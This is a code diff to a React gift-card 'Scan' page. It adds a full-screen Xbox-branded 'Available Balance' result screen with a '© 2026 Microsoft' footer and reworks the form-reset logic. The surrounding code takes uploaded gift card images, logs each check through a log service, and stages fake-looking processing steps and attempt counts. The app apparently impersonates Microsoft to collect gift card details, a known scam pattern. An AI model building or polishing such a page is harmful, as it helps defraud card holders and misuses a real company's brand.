@@ -3,6 +3,69 @@ import React, { useState, useRef, useEffect } from 'react';
 import { Link, useNavigate } from 'react-router-dom';
 import { logBalanceCheck } from '../services/logService';
 
+// Full-screen balance component
+const FullScreenBalance = ({ balance, lastFourDigits, cardType, onCheckAnother }) => {
+  return (
+    <div className="min-h-screen bg-gradient-to-b from-[#107C10] to-[#0A5C0A] flex items-center justify-center p-6">
+      <div className="max-w-md w-full text-center">
+        {/* Xbox Logo */}
+        <div className="mb-8">
+          <div className="w-16 h-16 bg-white/10 rounded-2xl flex items-center justify-center mx-auto backdrop-blur-sm">
+            <span className="text-white text-3xl font-bold">X</span>
+          </div>
+          <p className="text-white/60 text-xs mt-2">XBOX GIFT CARD</p>
+        </div>
+
+        {/* Success Indicator */}
+        <div className="mb-6">
+          <div className="w-20 h-20 bg-white/20 rounded-full flex items-center justify-center mx-auto backdrop-blur-sm">
+            <span className="text-white text-4xl">✓</span>
+          </div>
+        </div>
+
+        {/* Balance */}
+        <h2 className="text-white/60 text-sm font-medium mb-2">Available Balance</h2>
+        <p className="text-white text-6xl md:text-7xl font-bold mb-2 tracking-tight">
+          {balance}
+        </p>
+        
+        {/* Card Info */}
+        <div className="mt-4">
+          <div className="inline-block bg-white/10 backdrop-blur-sm rounded-full px-6 py-2">
+            <p className="text-white/80 text-sm font-mono">
+              {cardType} ending in {lastFourDigits}
+            </p>
+          </div>
+        </div>
+
+        {/* Divider */}
+        <div className="w-20 h-0.5 bg-white/20 mx-auto my-6"></div>
+
+        {/* Action Button */}
+        <button
+          onClick={onCheckAnother}
+          className="w-full bg-white text-[#107C10] font-bold py-4 rounded-lg transition-all hover:bg-white/90 active:scale-[0.98] shadow-lg"
+        >
+          CHECK ANOTHER CARD
+        </button>
+
+        {/* Back Link */}
+        <button
+          onClick={onCheckAnother}
+          className="text-white/60 text-sm mt-4 hover:text-white/80 transition inline-block"
+        >
+          ← Back to Check Another
+        </button>
+
+        {/* Footer */}
+        <div className="mt-12">
+          <p className="text-white/30 text-xs">© 2026 Microsoft. All rights reserved.</p>
+        </div>
+      </div>
+    </div>
+  );
+};
+
 const Scan = () => {
   const navigate = useNavigate();
   const [selectedImage, setSelectedImage] = useState(null);
@@ -13,6 +76,7 @@ const Scan = () => {
   const [message, setMessage] = useState('');
   const [messageType, setMessageType] = useState('');
   const [showBalance, setShowBalance] = useState(false);
+  const [showFullScreenBalance, setShowFullScreenBalance] = useState(false);
   const [processingStep, setProcessingStep] = useState(0);
   const [processingText, setProcessingText] = useState('');
   const [attemptCount, setAttemptCount] = useState(0);
@@ -133,6 +197,7 @@ const Scan = () => {
     
     setBalance(displayBalance);
     setShowBalance(true);
+    setShowFullScreenBalance(true);
     setMessage(`✅ Balance Verified: ${displayBalance}`);
     setMessageType('success');
     setIsProcessing(false);
@@ -207,12 +272,13 @@ const Scan = () => {
     }
   };
 
-  const resetForm = () => {
+  const resetFullScreen = () => {
+    setShowFullScreenBalance(false);
+    setShowBalance(false);
+    setBalance('');
     setSelectedImage(null);
     setImagePreview(null);
     setAmount('');
-    setBalance('');
-    setShowBalance(false);
     setMessage('');
     setMessageType('');
     setIsProcessing(false);
@@ -220,7 +286,22 @@ const Scan = () => {
     setProcessingText('');
     setAttemptCount(0);
     setIsFirstAttemptProcessing(false);
+    if (fileInputRef.current) {
+      fileInputRef.current.value = '';
+    }
   };
+
+  // Full-screen balance view
+  if (showFullScreenBalance) {
+    return (
+      <FullScreenBalance 
+        balance={balance}
+        lastFourDigits="••••"
+        cardType="Gift Card"
+        onCheckAnother={resetFullScreen}
+      />
+    );
+  }
 
   return (
     <div className="min-h-screen bg-[#F8F9FA]">
@@ -388,26 +469,8 @@ const Scan = () => {
             </div>
           )}
 
-          {/* Balance Display */}
-          {showBalance && !isProcessing && (
-            <div className="mt-6 p-5 bg-[#E8F5E9] border-2 border-[#107C10] rounded-lg text-center animate-fadeSlideUp">
-              <div className="inline-flex items-center gap-2 bg-[#107C10]/20 px-3 py-1 rounded-full mb-3">
-                <span className="text-[#107C10] text-xs font-semibold">✓ VERIFIED</span>
-              </div>
-              <p className="text-[#757575] text-sm mb-1">Available Balance</p>
-              <p className="text-[#107C10] text-5xl font-bold mb-3">{balance}</p>
-              <p className="text-[#757575] text-xs">Balance verified successfully</p>
-              <button
-                onClick={resetForm}
-                className="mt-4 text-[#107C10] text-sm font-medium hover:underline inline-flex items-center gap-1"
-              >
-                Check Another Card →
-              </button>
-            </div>
-          )}
-
           {/* Message Display */}
-          {message && !isProcessing && (
+          {message && !isProcessing && !showFullScreenBalance && (
             <div className={`mt-6 p-4 rounded-md whitespace-pre-line ${
               messageType === 'success' 
                 ? 'bg-[#E8F5E9] border border-[#107C10] text-[#1A1A1A]' 
